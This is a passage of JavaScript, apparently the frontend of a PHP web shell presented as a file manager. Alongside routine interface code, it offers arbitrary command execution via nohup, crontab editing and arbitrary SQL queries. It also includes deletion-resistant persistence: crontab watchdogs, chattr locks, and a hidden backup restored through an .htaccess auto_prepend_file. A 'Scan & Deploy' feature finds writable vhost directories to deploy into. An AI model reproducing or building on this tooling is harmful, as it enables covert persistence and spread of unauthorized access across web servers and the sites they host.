  setTimeout(() => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); }, 3500);
}

// ──────────────────────────────────────────────
// MODALS
// ──────────────────────────────────────────────
function openModal(id) {
  const el = document.getElementById(id);
  if (el) { el.classList.add('open'); el.addEventListener('click', e => { if (e.target === el) closeModal(id); }); }
}

function closeModal(id) {
  const el = document.getElementById(id);
  if (el) el.classList.remove('open');
  // Clean up CodeMirror when editor modal is closed
  if (id === 'modal-editor' && cmEditor) {
    cmEditor.toTextArea();
    cmEditor = null;
    state.editorFile = null;
  }
}

function showConfirm(title, message, onOk) {
  document.getElementById('confirm-title').textContent = title;
  document.getElementById('confirm-message').textContent = message;
  const btn = document.getElementById('confirm-ok');
  const newBtn = btn.cloneNode(true);
  btn.parentNode.replaceChild(newBtn, btn);
  newBtn.id = 'confirm-ok';
  newBtn.addEventListener('click', () => { closeModal('modal-confirm'); onOk(); });
  openModal('modal-confirm');
}

function openNewItem() {
  document.getElementById('new-item-name').value = '';
  selectNewType('folder');
  openModal('modal-new-item');
  setTimeout(() => document.getElementById('new-item-name').focus(), 150);
}

function selectNewType(type) {
  document.getElementById('rb-folder').classList.toggle('selected', type === 'folder');
  document.getElementById('rb-file').classList.toggle('selected', type === 'file');
}

// ──────────────────────────────────────────────
// THEME
// ──────────────────────────────────────────────
function toggleTheme() {
  const html = document.documentElement;
  const next = html.dataset.theme === 'dark' ? 'light' : 'dark';
  html.dataset.theme = next;
  state.theme = next;
  const icon = document.getElementById('theme-icon');
  if (icon) icon.className = next === 'dark' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
  localStorage.setItem('fm_theme', next);
}

// ──────────────────────────────────────────────
// VIEW TOGGLE
// ──────────────────────────────────────────────
function toggleView() {
  const container = document.getElementById('files-container');
  const icon = document.getElementById('view-icon');
  if (state.view === 'grid') {
    state.view = 'list';
    container.classList.add('list-view');
    if (icon) icon.className = 'fa-solid fa-list';
  } else {
    state.view = 'grid';
    container.classList.remove('list-view');
    if (icon) icon.className = 'fa-solid fa-table-cells-large';
  }
  localStorage.setItem('fm_view', state.view);
}

// ──────────────────────────────────────────────
// SETTINGS
// ──────────────────────────────────────────────
function openSettings() { openModal('modal-settings'); }

async function saveSettings() {
  const config = {
    lang: document.getElementById('set-lang').value,
    theme: document.getElementById('set-theme').value,
    date_format: document.getElementById('set-date-format').value,
    show_hidden: document.getElementById('set-show-hidden').checked,
  };
  const res = await api('settings', { config: JSON.stringify(config) });
  closeModal('modal-settings');
  if (res.ok) { toast(res.msg, 'success'); location.reload(); }
  else toast(res.msg, 'error');
}

function switchTab(btn, paneId) {
  btn.closest('.tab-nav').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  btn.closest('.modal-body').querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
  document.getElementById(paneId).classList.add('active');
}

async function changeMyPassword() {
  const old = document.getElementById('cp-old').value;
  const neu = document.getElementById('cp-new').value;
  const con = document.getElementById('cp-confirm').value;
  const result = document.getElementById('cp-result');
  result.innerHTML = '';
  if (!old || !neu || !con) {
    result.innerHTML = '<span style="color:var(--danger)">Please fill in all fields</span>';
    return;
  }
  if (neu.length < 6) {
    result.innerHTML = '<span style="color:var(--danger)">New password must be at least 6 characters</span>';
    return;
  }
  if (neu !== con) {
    result.innerHTML = '<span style="color:var(--danger)">New password and confirmation do not match</span>';
    return;
  }
  result.innerHTML = '<span style="color:var(--text-muted)">Updating...</span>';
  const res = await api('change_password', {
    old_password: old,
    new_password: neu,
    confirm_password: con
  });
  if (res.ok) {
    result.innerHTML = '<span style="color:var(--accent)">✓ ' + res.msg + '</span>';
    toast('Password changed! Logging out...', 'success');
    document.getElementById('cp-old').value = '';
    document.getElementById('cp-new').value = '';
    document.getElementById('cp-confirm').value = '';
    setTimeout(async () => {
      await api('logout');
      window.location.reload();
    }, 1800);
  } else {
    result.innerHTML = '<span style="color:var(--danger)">✗ ' + res.msg + '</span>';
    toast(res.msg, 'error');
  }
}

async function generateHash() {
  const pwd = document.getElementById('hash-input').value;
  if (!pwd) return;
  const res = await api('hash', { password: pwd });
  if (res.ok) document.getElementById('hash-output').value = res.data.hash;
  else toast(res.msg, 'error');
}

// ──────────────────────────────────────────────
// AUTH
// ──────────────────────────────────────────────
async function doLogin() {
  const user = document.getElementById('login-user').value.trim();
  const pass = document.getElementById('login-pass').value;
  const errEl = document.getElementById('login-error');
  errEl.textContent = '';
  if (!user || !pass) { errEl.textContent = 'Fill in all fields'; return; }
  const fd = new FormData();
  fd.append('action', 'login');
  fd.append('username', user);
  fd.append('password', pass);
  try {
    const r = await fetch(location.href, { method: 'POST', body: fd });
    const j = await r.json();
    if (j.ok) { FM.TOKEN = j.data.token; location.reload(); }
    else errEl.textContent = j.msg;
  } catch(e) { errEl.textContent = 'Connection error'; }
}

async function doLogout() {
  await api('logout');
  location.reload();
}

// Enter key on login
document.addEventListener('DOMContentLoaded', () => {
  const passEl = document.getElementById('login-pass');
  if (passEl) passEl.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
  const userEl = document.getElementById('login-user');
  if (userEl) userEl.addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('login-pass').focus(); });
});

// ──────────────────────────────────────────────
// CRONTAB
// ──────────────────────────────────────────────
async function openCrontab() {
  openModal('modal-crontab');
  document.getElementById('crontab-editor').value = 'Loading...';
  const res = await api('crontab', { sub: 'list' });
  if (res.ok) {
    document.getElementById('crontab-editor').value = res.data.content || '# No crontab for current user';
  } else {
    document.getElementById('crontab-editor').value = '# Error: ' + res.msg;
  }
}

async function saveCrontab() {
  const content = document.getElementById('crontab-editor').value;
  const res = await api('crontab', { sub: 'save', content });
  if (res.ok) toast(res.msg, 'success');
  else toast(res.msg, 'error');
}

// ──────────────────────────────────────────────
// FILE PROTECTION (crontab watchdog)
// ──────────────────────────────────────────────
async function lockChattr(path) {
  const r = await api('lock_chattr', { item: path });
  toast(r.msg, r.ok ? 'success' : 'error');
  navigate(state.path);
}

async function unlockChattr(path) {
  const r = await api('unlock_chattr', { item: path });
  toast(r.msg, r.ok ? 'success' : 'error');
  navigate(state.path);
}

async function lockWatch(path) {
  const r = await api('lock_watch', { item: path });
  toast(r.msg, r.ok ? 'success' : 'error');
  refreshWatchBadge();
  navigate(state.path);
}

async function unlockStop(path) {
  const r = await api('unlock_stop', { item: path });
  toast(r.msg, r.ok ? 'success' : 'error');
  refreshWatchBadge();
  navigate(state.path);
}

async function refreshWatchBadge() {
  try {
    const r = await api('watch_list');
    if (!r.ok) return;
    let b = document.getElementById('fm-watch-badge');
    if (!b) {
      const tb = document.querySelector('.topbar-actions') || document.getElementById('topbar') || document.body;
      b = document.createElement('span');
      b.id = 'fm-watch-badge';
      b.style.cssText = 'display:inline-block;padding:3px 9px;margin-left:10px;background:rgba(110,231,183,0.15);color:var(--accent);border-radius:10px;font-size:11px;font-family:var(--font-mono);cursor:pointer';
      b.title = 'Active watchdogs';
      b.onclick = () => {
        const w = r.data.watches;
        alert(w.length ? 'Watching:\n' + w.map(x => '• ' + x.path + ' (PID ' + x.pid + ')').join('\n') : 'No active watches');
      };
      tb.appendChild(b);
    }
    b.textContent = '👁 ' + r.data.count + ' watching';
    b.style.display = r.data.count > 0 ? 'inline-block' : 'none';
  } catch (e) {}
}

setInterval(refreshWatchBadge, 30000);
setTimeout(refreshWatchBadge, 1500);

async function qLockItem(path) {
  const name = path.split('/').pop();
  showConfirm(
    `Lock "${name}"?`,
    `Files will be set to 0444 and folders to 0555 (read-only). Recursive for folders.`,
    async () => {
      const res = await api('qlock', { item: path });
      if (res.ok) toast(res.msg, 'success'); else toast(res.msg, 'error');
      navigate(state.path);
    }
  );
}

async function qUnlockItem(path) {
  const name = path.split('/').pop();
  showConfirm(
    `Unlock "${name}"?`,
    `Files will be set to 0644 and folders to 0755. Recursive for folders. Applied 4 times.`,
    async () => {
      const res = await api('qunlock', { item: path });
      if (res.ok) toast(res.msg, 'success'); else toast(res.msg, 'error');
      navigate(state.path);
    }
  );
}

async function scanMalware(path) {
  toast('Scanning... this may take a moment', 'info');
  const res = await api('scan_malware', { item: path });
  if (!res.ok) { toast(res.msg, 'error'); return; }
  const d = res.data;
  let html = `<div style="padding:14px;background:var(--bg-2);border-radius:8px;margin-bottom:14px;font-size:13px">
    <strong>Files scanned:</strong> ${d.scanned} &nbsp;
    <strong>Skipped:</strong> ${d.skipped} &nbsp;
    <strong>Findings:</strong> <span style="color:${d.count?'var(--danger)':'var(--accent)'};font-weight:700">${d.count}</span>
    ${d.truncated?' <span style="color:var(--warning)">(truncated at 300)</span>':''}
  </div>`;
  if (d.findings.length === 0) {
    html += '<p style="color:var(--accent);text-align:center;padding:30px;font-size:15px">✓ No suspicious patterns found</p>';
  } else {
    const esc = s => String(s).replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
    html += '<div style="max-height:420px;overflow-y:auto;padding-right:4px">';
    for (const f of d.findings) {
      const sevColor = f.severity === 'high' ? 'var(--danger)' : 'var(--warning)';
      const sevBg = f.severity === 'high' ? 'rgba(248,113,113,0.08)' : 'rgba(251,191,36,0.08)';
      const folder = f.file.split('/').slice(0,-1).join('/');
      html += `<div style="padding:10px 12px;border-left:3px solid ${sevColor};background:${sevBg};margin-bottom:8px;border-radius:4px">
        <div style="display:flex;justify-content:space-between;align-items:center;font-size:12px;margin-bottom:4px">
          <strong style="color:${sevColor};letter-spacing:0.5px">${f.severity.toUpperCase()}</strong>
          <span style="color:var(--text-muted);font-size:11px">${esc(f.label)}</span>
        </div>
        <div style="font-family:var(--font-mono);font-size:11px;color:var(--info);cursor:pointer;text-decoration:underline" onclick="closeModal('modal-confirm');navigate('${folder}')">${esc(f.file)}:${f.line}</div>
        <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);margin-top:6px;white-space:pre-wrap;word-break:break-all;background:rgba(0,0,0,0.2);padding:6px 8px;border-radius:3px">${esc(f.snippet)}</div>
      </div>`;
    }
    html += '</div>';
  }
  // Reuse the confirm modal as a result viewer
  document.getElementById('confirm-title').textContent = `🛡️ Security Scan: ${path.split('/').pop() || '/'}`;
  document.getElementById('confirm-message').innerHTML = html;
  const okBtn = document.getElementById('confirm-ok');
  const oldOnclick = okBtn.onclick;
  okBtn.style.display = 'none';
  openModal('modal-confirm');
  // Restore on close
  const restore = () => { okBtn.style.display = ''; okBtn.onclick = oldOnclick; document.removeEventListener('modal-closed', restore); };
  setTimeout(() => {
    const m = document.getElementById('modal-confirm');
    const obs = new MutationObserver(() => { if (!m.classList.contains('show')) { restore(); obs.disconnect(); } });
    obs.observe(m, { attributes: true, attributeFilter: ['class'] });
  }, 50);
}

async function protectFile(path) {
  const name = path.split('/').pop();
  showConfirm(
    `Protect "${name}"?`,
    `This file will be backed up and auto-restored if deleted (via crontab). Works on Linux servers only.`,
    async () => {
      const res = await api('protect', { item: path });
      if (res.ok) toast(res.msg, 'success');
      else toast(res.msg, 'error');
    }
  );
}

async function unprotectFile(path) {
  const name = path.split('/').pop();
  showConfirm(
    `Remove protection from "${name}"?`,
    `The crontab watchdog and backup will be removed. The file can be deleted normally.`,
    async () => {
      const res = await api('unprotect', { item: path });
      if (res.ok) toast(res.msg, 'success');
      else toast(res.msg, 'error');
    }
  );
}

// ──────────────────────────────────────────────
// NOHUP & PROCESSES
// ──────────────────────────────────────────────
function openNohup() {
  document.getElementById('nohup-cmd').value = '';
  const cwdEl = document.getElementById('nohup-cwd');
  if (cwdEl) cwdEl.textContent = '/' + state.path;
  openModal('modal-nohup');
  setTimeout(() => document.getElementById('nohup-cmd').focus(), 150);
}

async function doNohup() {
  const cmd = document.getElementById('nohup-cmd').value.trim();
  if (!cmd) return;
  const res = await api('nohup', { cmd, path: state.path });
  closeModal('modal-nohup');
  if (res.ok) toast(res.msg, 'success');
  else toast(res.msg, 'error');
}

async function openProcesses() {
  openModal('modal-processes');
  loadProcesses();
}

async function loadProcesses() {
  const out = document.getElementById('processes-output');
  out.textContent = 'Loading...';
  const res = await api('processes');
  if (res.ok) out.textContent = res.data.output || 'No processes found';
  else out.textContent = 'Error: ' + res.msg;
}

// ──────────────────────────────────────────────
// UTILITIES
// ──────────────────────────────────────────────
function esc(s) {
  if (s === null || s === undefined) return '';
  const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
  return String(s).replace(/[&<>"']/g, c => map[c]);
}

function permClass(p) {
  if (!p) return '';
  // Check last 3 digits for world/group write
  const n = parseInt(p, 8);
  if (isNaN(n)) return '';
  const other = n & 7;
  const group = (n >> 3) & 7;
  // 0777, 0776, 0766, etc — world writable = danger
  if (other & 2) return 'perm-danger';
  // 0775, 0774, 0664 — group writable = warn
  if (group & 2) return 'perm-warn';
  // 0755, 0644, 0600, etc — safe
  return 'perm-safe';
}

function setLoading(show) {
  // simple: could add a loading spinner overlay
}

function copyLink(path) {
  const url = location.origin + location.pathname + '?action=download&path=' + encodeURIComponent(path);
  copyToClipboard(url);
}

function copyToClipboard(text) {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(() => toast('Copied!', 'success'));
  } else {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
    toast('Copied!', 'success');
  }
}

function onDragStart(e, path) {
  e.dataTransfer.setData('text/plain', path);
  e.dataTransfer.effectAllowed = 'move';
}

// ──────────────────────────────────────────────
// KEYBOARD SHORTCUTS
// ──────────────────────────────────────────────
document.addEventListener('keydown', e => {
  // Close modals on Escape
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal-backdrop.open').forEach(m => closeModal(m.id));
    hideCtx();
  }
  // Ctrl+A select all
  if (e.ctrlKey && e.key === 'a' && !e.target.closest('input, textarea, .CodeMirror')) {
    e.preventDefault();
    const sa = document.getElementById('select-all');
    if (sa) { sa.checked = true; toggleSelectAll(true); }
  }
  // Delete selected
  if (e.key === 'Delete' && !e.target.closest('input, textarea, .CodeMirror')) {
    if (state.selected.size > 0 && !FM.READONLY) deleteSelected();
  }
  // F2 rename (if one selected)
  if (e.key === 'F2' && state.selected.size === 1 && !FM.READONLY) {
    e.preventDefault();
    openRename([...state.selected][0]);
  }
  // Backspace to go back
  if (e.key === 'Backspace' && !e.target.closest('input, textarea, .CodeMirror')) {
    e.preventDefault();
    goBack();
  }
});

// ──────────────────────────────────────────────
// INITIALIZATION
// ──────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Restore theme
  const savedTheme = localStorage.getItem('fm_theme');
  if (savedTheme && savedTheme !== document.documentElement.dataset.theme) {
    document.documentElement.dataset.theme = savedTheme;
    state.theme = savedTheme;
    const icon = document.getElementById('theme-icon');
    if (icon) icon.className = savedTheme === 'dark' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
  }

  // Restore view mode
  if (state.view === 'list') {
    const container = document.getElementById('files-container');
    const icon = document.getElementById('view-icon');
    if (container) container.classList.add('list-view');
    if (icon) icon.className = 'fa-solid fa-list';
  }

  // Setup drag/drop
  setupDropZone();

  // If logged in, navigate to saved path (from URL hash) or DOCUMENT_ROOT
  if (document.getElementById('app')) {
    const hashPath = location.hash ? decodeURIComponent(location.hash.substring(1)) : '';
    navigate(hashPath || FM.INITIAL_PATH || '');
  }

  // Enter key on new item
  const newItemName = document.getElementById('new-item-name');
  if (newItemName) newItemName.addEventListener('keydown', e => { if (e.key === 'Enter') createNewItem(); });

  // Enter key on rename
  const renameInput = document.getElementById('rename-input');
  if (renameInput) renameInput.addEventListener('keydown', e => { if (e.key === 'Enter') doRename(); });

  // Enter key on nohup
  const nohupCmd = document.getElementById('nohup-cmd');
  if (nohupCmd) nohupCmd.addEventListener('keydown', e => { if (e.key === 'Enter') doNohup(); });

  // Update full path in statusbar (show absolute path)
  const sbPath = document.getElementById('sb-path');
  if (sbPath) sbPath.title = 'Full server path shown here';
});

// ──────────────────────────────────────────────
// DATABASE PANEL
// ──────────────────────────────────────────────
let dbCurrentTable = '';
let dbBrowseOffset = 0;
const dbBrowseLimit = 50;

function dbSwitchTab(tab) {
  document.querySelectorAll('#db-tabs .wp-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
  document.querySelectorAll('#modal-database .wp-pane').forEach(p => p.classList.toggle('active', p.id === 'db-pane-' + tab));
}

function openDbPanel() {
  openModal('modal-database');
  dbLoadInfo();
  dbLoadTables();
}

function dbReload() {
  const active = document.querySelector('#db-tabs .wp-tab.active');
  const tab = active ? active.dataset.tab : 'db-info';
  if (tab === 'db-info') dbLoadInfo();
  else if (tab === 'db-tables') dbLoadTables();
  else if (tab === 'db-browse' && dbCurrentTable) dbBrowseTable(dbCurrentTable, 0);
}

async function dbLoadInfo() {
  const box = document.getElementById('db-info-body');
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('db_detect');
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger);padding:16px">${esc(r.msg)}</p>`; return; }
  const d = r.data;
  box.innerHTML = `<div class="wp-info-grid">` +
    [['Host', d.host], ['Database', d.name], ['User', d.user], ['Server', d.server], ['Charset (config)', d.charset], ['Charset (conn)', d.conn_charset]]
    .map(([l,v]) => `<label>${esc(l)}</label><div class="v">${esc(v || '—')}</div>`).join('') +
    `</div>`;
}

async function dbLoadTables() {
  const box = document.getElementById('db-tables-body');
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('db_tables');
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger);padding:16px">${esc(r.msg)}</p>`; return; }
  const tables = r.data || [];
  if (!tables.length) { box.innerHTML = '<p style="color:var(--text-muted);padding:16px">No tables found.</p>'; return; }
  const fmtSize = (b) => { if (b < 1024) return b + ' B'; if (b < 1048576) return (b/1024).toFixed(1) + ' KB'; return (b/1048576).toFixed(1) + ' MB'; };
  box.innerHTML = `<table class="wp-table">
    <thead><tr><th>Table</th><th>Engine</th><th>Rows</th><th>Size</th><th>Collation</th><th style="width:180px">Action</th></tr></thead>
    <tbody>${tables.map(t => `<tr>
      <td><strong style="cursor:pointer;color:var(--accent)" onclick="dbBrowseTable('${esc(t.name)}', 0)">${esc(t.name)}</strong></td>
      <td style="font-size:12px;color:var(--text-muted)">${esc(t.engine)}</td>
      <td>${t.rows.toLocaleString()}</td>
      <td style="font-size:12px">${fmtSize(t.size)}</td>
      <td style="font-size:11px;color:var(--text-dim)">${esc(t.collation)}</td>
      <td style="display:flex;gap:4px"><button class="btn btn-ghost btn-sm" onclick="dbBrowseTable('${esc(t.name)}', 0)"><i class="fa-solid fa-table-list"></i> Browse</button><button class="btn btn-ghost btn-sm" onclick="dbShowStructure('${esc(t.name)}')"><i class="fa-solid fa-sitemap"></i> Structure</button></td>
    </tr>`).join('')}</tbody></table>`;
}

async function dbBrowseTable(table, offset) {
  dbCurrentTable = table;
  dbBrowseOffset = offset || 0;
  dbSwitchTab('db-browse');
  document.getElementById('db-browse-table').textContent = table;
  const box = document.getElementById('db-browse-body');
  box.innerHTML = '<div style="padding:20px;text-align:center"><div class="spinner"></div></div>';
  const r = await api('db_data', { table, limit: dbBrowseLimit, offset: dbBrowseOffset });
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger);padding:16px">${esc(r.msg)}</p>`; return; }
  const { fields, rows, total } = r.data;
  const page = Math.floor(dbBrowseOffset / dbBrowseLimit) + 1;
  const pages = Math.ceil(total / dbBrowseLimit);
  document.getElementById('db-page-info').textContent = `${page} / ${pages} (${total} rows)`;
  document.getElementById('db-prev').disabled = dbBrowseOffset <= 0;
  document.getElementById('db-next').disabled = dbBrowseOffset + dbBrowseLimit >= total;
  if (!rows.length) { box.innerHTML = '<p style="color:var(--text-dim);padding:20px;text-align:center">Table is empty</p>'; return; }
  box.innerHTML = `<table class="db-result-table">
    <thead><tr>${fields.map(f => `<th>${esc(f)}</th>`).join('')}</tr></thead>
    <tbody>${rows.map(row => `<tr>${fields.map(f => {
      const v = row[f];
      return v === null ? `<td class="null-val">NULL</td>` : `<td title="${esc(String(v))}">${esc(String(v))}</td>`;
    }).join('')}</tr>`).join('')}</tbody></table>`;
}

function dbBrowsePage(dir) {
  const newOff = dbBrowseOffset + (dir * dbBrowseLimit);
  if (newOff < 0) return;
  dbBrowseTable(dbCurrentTable, newOff);
}

async function dbShowStructure(table) {
  dbSwitchTab('db-browse');
  document.getElementById('db-browse-table').textContent = table + ' — Structure';
  const box = document.getElementById('db-browse-body');
  box.innerHTML = '<div style="padding:20px;text-align:center"><div class="spinner"></div></div>';
  document.getElementById('db-page-info').textContent = '—';
  document.getElementById('db-prev').disabled = true;
  document.getElementById('db-next').disabled = true;
  const r = await api('db_structure', { table });
  if (!r.ok) { box.innerHTML = `<p style="color:var(--danger);padding:16px">${esc(r.msg)}</p>`; return; }
  const cols = r.data || [];
  box.innerHTML = `<table class="db-result-table">
    <thead><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead>
    <tbody>${cols.map(c => `<tr>
      <td><strong>${esc(c.Field)}</strong></td>
      <td>${esc(c.Type)}</td>
      <td>${c.Null === 'YES' ? '<span style="color:var(--warning)">YES</span>' : 'NO'}</td>
      <td>${c.Key ? `<span style="color:var(--accent)">${esc(c.Key)}</span>` : '—'}</td>
      <td class="${c.Default === null ? 'null-val' : ''}">${c.Default === null ? 'NULL' : esc(String(c.Default))}</td>
      <td style="color:var(--text-muted)">${esc(c.Extra || '')}</td>
    </tr>`).join('')}</tbody></table>`;
}

async function dbRunQuery() {
  const sql = document.getElementById('db-sql-input').value.trim();
  if (!sql) { toast('Enter a SQL query', 'error'); return; }
  const status = document.getElementById('db-query-status');
  const box = document.getElementById('db-query-body');
  status.textContent = 'Executing...';
  box.innerHTML = '<div class="spinner"></div>';
  const r = await api('db_query', { sql });
  if (!r.ok) { status.textContent = ''; box.innerHTML = `<p style="color:var(--danger)">${esc(r.msg)}</p>`; return; }
  const d = r.data;
  if (d.type === 'select') {
    status.textContent = r.msg;
    if (!d.rows.length) { box.innerHTML = '<p style="color:var(--text-dim)">No results</p>'; return; }
    box.innerHTML = `<table class="db-result-table">
      <thead><tr>${d.fields.map(f => `<th>${esc(f)}</th>`).join('')}</tr></thead>
      <tbody>${d.rows.map(row => `<tr>${d.fields.map(f => {
        const v = row[f];
        return v === null ? `<td class="null-val">NULL</td>` : `<td title="${esc(String(v))}">${esc(String(v))}</td>`;
      }).join('')}</tr>`).join('')}</tbody></table>`;
  } else {
    status.textContent = r.msg;
    box.innerHTML = `<div style="padding:12px;background:var(--bg-overlay);border-radius:var(--r-md)">
      <p><strong style="color:var(--success)">Query executed successfully</strong></p>
      <p style="font-size:12px;color:var(--text-muted);margin-top:4px">Affected rows: ${d.affected}${d.insert_id ? ' | Last insert ID: ' + d.insert_id : ''}</p>
    </div>`;
  }
}

// ──────────────────────────────────────────────
// BACKUP & AUTO-RESTORE
// ──────────────────────────────────────────────
async function checkBackupStatus() {
  const r = await api('backup_status');
  const btn = document.getElementById('btn-backup');
  const label = document.getElementById('btn-backup-label');
  if (!btn || !label) return;
  if (r.ok && r.data && r.data.active) {
    label.textContent = 'Backup ✓';
    btn.title = 'Backup active since ' + (r.data.created || '?') + '\nDir: ' + (r.data.backup_dir || '?');
    btn.style.color = 'var(--success)';
  } else {
    label.textContent = 'Backup';
    btn.title = 'Create auto-restore backup';
    btn.style.color = '';
  }
}

async function openBackupPanel() {
  const r = await api('backup_status');
  if (r.ok && r.data && r.data.active) {
    const info = r.data;
    const action = confirm(
      'Backup is ACTIVE\n\n' +
      'Created: ' + (info.created || '?') + '\n' +
      'Dir: ' + (info.backup_dir || '?') + '\n' +
      'Checker: ' + (info.checker_ok ? 'OK' : 'MISSING') + '\n\n' +
      'Click OK to REMOVE backup, Cancel to keep it.'
    );
    if (action) {
      const rm = await api('backup_remove');
      if (rm.ok) {
        toast('Backup removed', 'success');
        checkBackupStatus();
      } else {
        toast(rm.msg || 'Failed to remove backup', 'error');
      }
    }
  } else {
    if (!confirm('Create auto-restore backup?\n\nThis will:\n1. Save a compressed copy of this file in a hidden random directory\n2. Add auto_prepend_file to .htaccess for auto-restore\n3. If this file is deleted, visiting any PHP page will restore it')) return;
    toast('Creating backup...', 'info');
    const cr = await api('backup_create');
    if (cr.ok) {
      toast('Backup created!', 'success');
      checkBackupStatus();
    } else {
      toast(cr.msg || 'Failed to create backup', 'error');
    }
  }
}

(function(){ setTimeout(checkBackupStatus, 1500); })();

// ──────────────────────────────────────────────
// SCAN & DEPLOY
// ──────────────────────────────────────────────
let sdVhosts = [];
let sdSelected = new Set();
let sdPickPath = '/';
let sdBaseDir = '';

function sdShowPhase(phase) {
  document.querySelectorAll('.sd-phase').forEach(p => p.classList.remove('active'));
  const el = document.getElementById('sd-phase-' + phase);
  if (el) el.classList.add('active');
  // Show/hide footer buttons per phase
  document.getElementById('sd-btn-scan').style.display = phase === 'pick' ? '' : 'none';
  document.getElementById('sd-btn-deploy').style.display = phase === 'results' ? '' : 'none';
  document.getElementById('sd-btn-copy').style.display = phase === 'done' ? '' : 'none';
  document.getElementById('sd-btn-rescan').style.display = (phase === 'results' || phase === 'done') ? '' : 'none';
}

async function openScanDeploy() {
  sdVhosts = [];
  sdSelected.clear();
  sdBaseDir = '';
  // Start at current absPath or /
  sdPickPath = state.absPath || '/';
  sdShowPhase('pick');
  openModal('modal-scan-deploy');
  sdLoadPicker(sdPickPath);
}

async function sdLoadPicker(absPath) {
  sdPickPath = absPath;
  // Render breadcrumb
  const bc = document.getElementById('sd-breadcrumb');
  const parts = absPath.replace(/^\/+/, '').split('/').filter(Boolean);
  let html = '<span style="cursor:pointer;color:var(--accent);font-weight:600" onclick="sdLoadPicker(\'/\')"><i class="fa-solid fa-hard-drive" style="font-size:11px"></i> /</span>';
  for (let i = 0; i < parts.length; i++) {
    const p = '/' + parts.slice(0, i + 1).join('/');
    const isLast = i === parts.length - 1;
    html += '<span style="color:var(--text-dim)">/</span>';
    html += '<span style="cursor:pointer;' + (isLast ? 'color:var(--accent);font-weight:600' : 'color:var(--text-main)') + '" onclick="sdLoadPicker(\'' + esc(p) + '\')">' + esc(parts[i]) + '</span>';
  }
  bc.innerHTML = html;

  // Load folders via tree action
  const list = document.getElementById('sd-folder-list');
  list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)"><div class="spinner" style="display:inline-block;margin-right:8px"></div> Loading...</div>';
  const res = await api('tree', { path: absPath });
  if (!res.ok) {
    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--danger)">' + esc(res.msg) + '</div>';
    return;
  }
  const dirs = res.data || [];
  if (dirs.length === 0) {
    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)">No subfolders found</div>';
    return;
  }
  list.innerHTML = dirs.map(function(d) {
    const full = absPath === '/' ? '/' + d.name : absPath + '/' + d.name;
    return '<div style="padding:8px 12px;border-bottom:1px solid var(--border-dim);cursor:pointer;display:flex;align-items:center;gap:8px;transition:background .15s" ' +
      'onmouseover="this.style.background=\'var(--bg-overlay)\'" onmouseout="this.style.background=\'none\'" ' +
      'onclick="sdLoadPicker(\'' + esc(full) + '\')">' +
      '<i class="fa-solid fa-folder" style="color:var(--accent);font-size:14px"></i>' +
      '<span style="font-size:13px">' + esc(d.name) + '</span>' +
    '</div>';
  }).join('');
}

async function sdDoScan() {
  if (!sdPickPath) { toast('Select a folder first', 'error'); return; }
  sdBaseDir = sdPickPath;
  sdVhosts = [];
  sdSelected.clear();
  sdShowPhase('scan');
  document.getElementById('sd-scan-msg').textContent = 'Scanning ' + sdBaseDir + ' recursively...';

  const res = await api('scan_vhosts', { base_dir: sdBaseDir });

  if (!res.ok) {
    sdShowPhase('results');
    document.getElementById('sd-stats').innerHTML = '<span style="color:var(--danger)">' + esc(res.msg) + '</span>';
    document.getElementById('sd-tbody').innerHTML = '';
    return;
  }

  sdVhosts = res.data.vhosts || [];
  const total = res.data.count || 0;
  const writable = res.data.writable_count || 0;
  const deployed = sdVhosts.filter(function(v) { return v.deployed; }).length;

  sdShowPhase('results');
  document.getElementById('sd-stats').innerHTML =
    '<span>Base: <code style="font-size:11px">' + esc(sdBaseDir) + '</code></span> ' +
    '<span>Total: <b>' + total + '</b></span> ' +
    '<span>Writable: <b>' + writable + '</b></span> ' +
    '<span>Deployed: <b>' + deployed + '</b></span>';

  sdRenderTable();
}

function sdRenderTable() {
  const tbody = document.getElementById('sd-tbody');
  if (sdVhosts.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px;color:var(--text-dim)">No subdirectories found in this folder</td></tr>';
    return;
  }
  tbody.innerHTML = sdVhosts.map(function(v, i) {
    const checked = sdSelected.has(i) ? 'checked' : '';
    const disabled = v.writable ? '' : 'disabled';
    const depth = v.depth || 0;
    const indent = depth > 0 ? '<span style="display:inline-block;width:' + (depth * 12) + 'px"></span>' : '';
    const wBadge = v.writable
      ? '<span class="sd-badge sd-badge-ok">YES</span>'
      : '<span class="sd-badge sd-badge-no">NO</span>';
    const sBadge = v.deployed
      ? '<span class="sd-badge sd-badge-done">DEPLOYED</span>'
      : '<span style="color:var(--text-dim);font-size:11px">—</span>';
    return '<tr>' +
      '<td><input type="checkbox" class="cb sd-cb" data-idx="' + i + '" ' + checked + ' ' + disabled + ' onchange="sdToggleOne(' + i + ', this.checked)"></td>' +
      '<td style="font-weight:500">' + indent + '<i class="fa-solid fa-folder" style="color:var(--accent);font-size:11px;margin-right:4px"></i>' + esc(v.name) + '</td>' +
      '<td><code style="font-size:11px;color:var(--text-muted)">' + esc(v.path) + '</code></td>' +
      '<td>' + wBadge + '</td>' +
      '<td>' + sBadge + '</td>' +
